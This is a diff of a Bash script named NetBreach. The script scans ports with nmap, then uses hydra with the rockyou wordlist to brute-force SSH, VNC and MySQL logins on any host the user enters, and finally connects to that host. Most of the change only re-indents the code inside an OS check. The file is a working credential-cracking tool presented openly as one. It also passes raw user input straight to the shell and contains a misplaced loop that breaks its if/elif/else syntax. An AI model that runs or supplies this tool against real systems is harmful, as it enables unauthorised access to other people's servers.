@@ -110,196 +110,202 @@ if [ "$1" = "--help" ] || [ "$1" = "-h" ]; then
 else
     # Clear the terminal
     clear
+    # Check if OSTYPE matches detected OS
+    if [[ "$OSTYPE" == "${os}"* ]]; then
 
-    # Tells the user if they want to crack the ports that are listed in the prompt or have help if they are stuck on what to do
-    NetBreach() {
-        # The logo of the program
-        figlet -f slant "${logo}"
+        # Tells the user if they want to crack the ports that are listed in the prompt or have help if they are stuck on what to do
+        NetBreach() {
+            # The logo of the program
+            figlet -f slant "${logo}"
 
-        echo "Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'"
-        echo "If you want to stop the program type 'stop'."
-        read -p ">>> " service
-        
-        if [[ "${service}" == "ALL" || "${service}" == "all" || "${service}" == "*" ]]; then
-            # Tells the user that it can take up to an hour to complete the scanning process
-            echo -e "${RED}This can take up to 1 hour to complete.${NC}"
-
-            # Scan the entire network and display open ports
-            sudo nmap -sS 127.0.0.1 -Pn -oN scan.txt --open
-            echo "Scan complete. Open ports saved to scan.txt"
-            # asks if the user want to see scan on a open file or not
-            read -p "Would you like to see the scan on a open file (Yes or No): " SeeFile
-            if [[ " ${yes[*]} " == *" ${SeeFile} "* ]]; then
-                echo "Opeing the scan file"
-                sleep 1
-                open scan.txt
-
-            else
-                echo -e "Ok I will not open the scan.txt file"
-                sleep 1
-            fi
+            echo "Type the number of the port you want to scan (SSH - 22, VNC - 5900, MySQL - 3306). To scan all, type 'ALL'"
+            echo "If you want to stop the program type 'stop'."
+            read -p ">>> " service
             
-            hydra -h
-            echo "Put in Hydra first to start the script."
-            echo ""
-            read -p ">>> " Hydra
+            if [[ "${service}" == "ALL" || "${service}" == "all" || "${service}" == "*" ]]; then
+                # Tells the user that it can take up to an hour to complete the scanning process
+                echo -e "${RED}This can take up to 1 hour to complete.${NC}"
 
-            if [[ " ${exit[*]} " == *" ${Hydra} "* ]]; then
-                echo "Goodbye"
+                # Scan the entire network and display open ports
+                sudo nmap -sS 127.0.0.1 -Pn -oN scan.txt --open
+                echo "Scan complete. Open ports saved to scan.txt"
+                # asks if the user want to see scan on a open file or not
+                read -p "Would you like to see the scan on a open file (Yes or No): " SeeFile
+                if [[ " ${yes[*]} " == *" ${SeeFile} "* ]]; then
+                    echo "Opeing the scan file"
+                    sleep 1
+                    open scan.txt
+
+                else
+                    echo -e "Ok I will not open the scan.txt file"
+                    sleep 1
+                fi
+                
+                hydra -h
+                echo "Put in Hydra first to start the script."
+                echo ""
+                read -p ">>> " Hydra
+
+                if [[ " ${exit[*]} " == *" ${Hydra} "* ]]; then
+                    echo "Goodbye"
+                    exit 1
+                else
+                    $Hydra
+                    exit 1
+                fi
+
+            # If the user asks what the program does, it goes to a function that helps them and explains what the program does
+            elif [[ " ${exit[*]} " == *" ${service} "* ]]; then
+                echo "Stopping program..."
+                sleep 1
                 exit 1
+            #checks if the user has put nothing into the input feild
+            elif [[ " ${empty[*]} " == *" ${service} "* ]]; then
+                echo -e "${RED}ERROR:${NC} plase input a number into the input field"
+                sleep 1
+                exit 1                
+            #checks if the user has put in a letter insted of a number into the input feild
+            for letter in "${alphabet[@]}"; do
+                if [[ "${letter}" == "${service}" ]]; then
+                    echo "Please enter a number next time"
+                    exit 1
+                fi
+            done
+
             else
-                $Hydra
-                exit 1
-            fi
+                # Scan specific port
+                sudo nmap -sS 127.0.0.1 -p $service -oN $service.txt --open
+                read -p "Would you like to see the ${service} on a open file (Yes or No): " SeeFile
 
-        # If the user asks what the program does, it goes to a function that helps them and explains what the program does
-        elif [[ " ${exit[*]} " == *" ${service} "* ]]; then
-            echo "Stopping program..."
-            sleep 1
-            exit 1
-        #checks if the user has put nothing into the input feild
-        elif [[ " ${empty[*]} " == *" ${service} "* ]]; then
-            echo -e "${RED}ERROR:${NC} plase input a number into the input field"
-            sleep 1
-            exit 1                
-        #checks if the user has put in a letter insted of a number into the input feild
-        for letter in "${alphabet[@]}"; do
-            if [[ "${letter}" == "${service}" ]]; then
-                echo "Please enter a number next time"
-                exit 1
+                if [[ " ${yes[*]} " == *" ${SeeFile} "* ]]; then
+                    open "${service}.txt"
+                else
+                    echo -e "\n[ ${RED}${BRIGHT}-${NC} ] Ok I will not open the ${service}.txt file"
+                    sleep 1
+                fi
             fi
-        done
+        }
 
+        RunHackingCommand() {
+            # Break in the outputs of my code
+            echo
+            # Services to crack the network
+            echo "To crack VNC(5900), don't type anything in the 'Input Username' prompt"
+            echo "To crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
+            
+            read -p "Input Username: " user
+            read -p "Input Hostname: " host
+            read -p "Input Port: " port
+
+        }
+
+        RunHackingCommandWithVNC() {
+            if [[ $service == 5900 || $service == "VNC" ]]; then
+                # Checks if the user has put anything in the 'Input Username' function and the hostname function
+                # If not, it will prompt the user to enter the username and hostname
+                if [[ $user == "" && $host == "" || $host == "" ]]; then
+                    # No service specified, re-prompt for input
+                    echo "No service specified"
+                    NetBreach
+                # If the user inputs something in the 'Input Username' function and the hostname function,
+                # it will continue as normal
+                else
+                    # Crack VNC password
+                    hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host:$port
+                    # Alerts the user that the computer is trying to connect to the VNC server
+                    title="Connecting to ${GREEN}${host}${NC}"
+                    Connecting_To_VNC_SERVER="We are connecting you to '${GREEN}${host}${NC}'. Please wait..."
+                    echo -e "${title}"
+                    echo -e "${Connecting_To_VNC_SERVER}"
+                    sleep 5
+
+                    # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
+                    # Notification for the user to see the computer is connected to the VNC server
+                    title="Enter password to ${GREEN}${host}${NC}"
+                    Connected_To_VNC_SERVER="We have connected you to '${GREEN}${host}${NC}'. Please enter the password to '${GREEN}${host}${NC}'. To continue..."
+                    echo ""
+                    echo "${title}"
+                    echo "${Connected_To_VNC_SERVER}"
+                    # Put the
+                    echo
+                    echo "Loading VNC server..."
+                    open "vnc://${host}"
+                    exit
+                fi
+            fi
+        }
+
+        RunHackingCommandWithSSH() {
+            if [[ $service == 22 || $service == "ssh" ]]; then
+                # Checks if the user has put anything in the 'Input Username' function and the hostname function
+                # If not, it will prompt the user to enter the username and hostname
+                if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
+                    # No service specified, re-prompt for input
+                    echo "No service specified"
+                    NetBreach
+                # If the user inputs something in the 'Input Username' function and the hostname function,
+                # it will continue as normal
+                else
+
+                    # Crack SSH password
+                    hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
+                    # Alerts the user that the computer is trying to connect to the ssh server
+                    title="Connecting to ${GREEN}${user}${NC}"
+                    Connecting_To_SSH_SERVER="We are connecting you to ${GREEN}${user}${NC}. Please wait..."
+                    echo ""
+                    echo -e "${title}"
+                    echo -e "${Connecting_To_SSH_SERVER}"
+                    sleep 5
+
+                    # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
+                    echo ""
+                    title="Enter password to ${GREEN}${user}${NC}"
+                    Connected_To_SSH_SERVER="We have connected you to ${GREEN}${user}${NC}. Please enter the password to ${GREEN}${user}${NC} to continue..."
+                    echo ""
+                    echo -e "${title}"
+                    echo -e "${Connected_To_SSH_SERVER}"
+                    echo ""
+                    echo "${user}@${host}" > "${ssh_connection}"
+                    sleep 1
+                    ssh "${user}@${host}" -p "${port}"
+
+                fi
+            fi
+        }
+
+        RunHackingCommandWithMySQL() {
+            if [[ $service == 3306 || $service == "mysql" ]]; then
+                # Checks if the user has put anything in the 'Input Username' function and the hostname function
+                # If not, it will prompt the user to enter the username and hostname
+                if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
+                    # No service specified, re-prompt for input
+                    echo "No service specified"
+                    NetBreach
+                # If the user inputs something in the 'Input Username' function and the hostname function,
+                # it will continue as normal
+                else
+                    # Crack MySQL password
+                    hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host:$port
+                    echo "Loading MySQL server..."
+                    sleep 3
+                    mysql -u "${user}" -p -A
+                fi
+            fi
+        }
+        NetBreach
+
+        RunHackingCommand # Calls the RunHackingCommand function
+
+        RunHackingCommandWithVNC # Calls the RunHackingCommandWithVNC function
+
+        RunHackingCommandWithSSH # Calls the RunHackingCommandWithSSH function
+
+        RunHackingCommandWithMySQL # Calls the RunHackingCommandWithMySQL function
         else
-            # Scan specific port
-            sudo nmap -sS 127.0.0.1 -p $service -oN $service.txt --open
-            read -p "Would you like to see the ${service} on a open file (Yes or No): " SeeFile
-
-            if [[ " ${yes[*]} " == *" ${SeeFile} "* ]]; then
-                open "${service}.txt"
-            else
-                echo -e "\n[ ${RED}${BRIGHT}-${NC} ] Ok I will not open the ${service}.txt file"
-                sleep 1
-            fi
+            echo "WARNING:TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE" >> ERROR.LOG
+            echo -e "[ ${RED}${BRIGHT}FAIL${NC} ] TIME:$CURRENT_TIME Wrong OS. Please use the correct OS. DATE:$CURRENT_DATE"
         fi
-    }
-
-    RunHackingCommand() {
-        # Break in the outputs of my code
-        echo
-        # Services to crack the network
-        echo "To crack VNC(5900), don't type anything in the 'Input Username' prompt"
-        echo "To crack MySQL(3306), type 'localhost' in the 'Input Hostname' prompt"
-        
-        read -p "Input Username: " user
-        read -p "Input Hostname: " host
-        read -p "Input Port: " port
-
-    }
-
-    RunHackingCommandWithVNC() {
-        if [[ $service == 5900 || $service == "VNC" ]]; then
-            # Checks if the user has put anything in the 'Input Username' function and the hostname function
-            # If not, it will prompt the user to enter the username and hostname
-            if [[ $user == "" && $host == "" || $host == "" ]]; then
-                # No service specified, re-prompt for input
-                echo "No service specified"
-                NetBreach
-            # If the user inputs something in the 'Input Username' function and the hostname function,
-            # it will continue as normal
-            else
-                # Crack VNC password
-                hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host:$port
-                # Alerts the user that the computer is trying to connect to the VNC server
-                title="Connecting to ${GREEN}${host}${NC}"
-                Connecting_To_VNC_SERVER="We are connecting you to '${GREEN}${host}${NC}'. Please wait..."
-                echo -e "${title}"
-                echo -e "${Connecting_To_VNC_SERVER}"
-                sleep 5
-
-                # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
-                # Notification for the user to see the computer is connected to the VNC server
-                title="Enter password to ${GREEN}${host}${NC}"
-                Connected_To_VNC_SERVER="We have connected you to '${GREEN}${host}${NC}'. Please enter the password to '${GREEN}${host}${NC}'. To continue..."
-                echo ""
-                echo "${title}"
-                echo "${Connected_To_VNC_SERVER}"
-                # Put the
-                echo
-                echo "Loading VNC server..."
-                open "vnc://${host}"
-                exit
-            fi
-        fi
-    }
-
-    RunHackingCommandWithSSH() {
-        if [[ $service == 22 || $service == "ssh" ]]; then
-            # Checks if the user has put anything in the 'Input Username' function and the hostname function
-            # If not, it will prompt the user to enter the username and hostname
-            if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
-                # No service specified, re-prompt for input
-                echo "No service specified"
-                NetBreach
-            # If the user inputs something in the 'Input Username' function and the hostname function,
-            # it will continue as normal
-            else
-
-                # Crack SSH password
-                hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
-                # Alerts the user that the computer is trying to connect to the ssh server
-                title="Connecting to ${GREEN}${user}${NC}"
-                Connecting_To_SSH_SERVER="We are connecting you to ${GREEN}${user}${NC}. Please wait..."
-                echo ""
-                echo -e "${title}"
-                echo -e "${Connecting_To_SSH_SERVER}"
-                sleep 5
-
-                # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
-                echo ""
-                title="Enter password to ${GREEN}${user}${NC}"
-                Connected_To_SSH_SERVER="We have connected you to ${GREEN}${user}${NC}. Please enter the password to ${GREEN}${user}${NC} to continue..."
-                echo ""
-                echo -e "${title}"
-                echo -e "${Connected_To_SSH_SERVER}"
-                echo ""
-                echo "${user}@${host}" > "${ssh_connection}"
-                sleep 1
-                ssh "${user}@${host}" -p "${port}"
-
-            fi
-        fi
-    }
-
-    RunHackingCommandWithMySQL() {
-        if [[ $service == 3306 || $service == "mysql" ]]; then
-            # Checks if the user has put anything in the 'Input Username' function and the hostname function
-            # If not, it will prompt the user to enter the username and hostname
-            if [[ $user == "" && $host == "" || $user == "" || $host == "" ]]; then
-                # No service specified, re-prompt for input
-                echo "No service specified"
-                NetBreach
-            # If the user inputs something in the 'Input Username' function and the hostname function,
-            # it will continue as normal
-            else
-                # Crack MySQL password
-                hydra -l "${user}" -P rockyou.txt -t 64 -vV -o output.log -I mysql://$host:$port
-                echo "Loading MySQL server..."
-                sleep 3
-                mysql -u "${user}" -p -A
-            fi
-        fi
-    }
-    NetBreach
-
-    RunHackingCommand # Calls the RunHackingCommand function
-
-    RunHackingCommandWithVNC # Calls the RunHackingCommandWithVNC function
-
-    RunHackingCommandWithSSH # Calls the RunHackingCommandWithSSH function
-
-    RunHackingCommandWithMySQL # Calls the RunHackingCommandWithMySQL function
-fi
+    fi
 else
     clear
     # Warning message for wrong OS
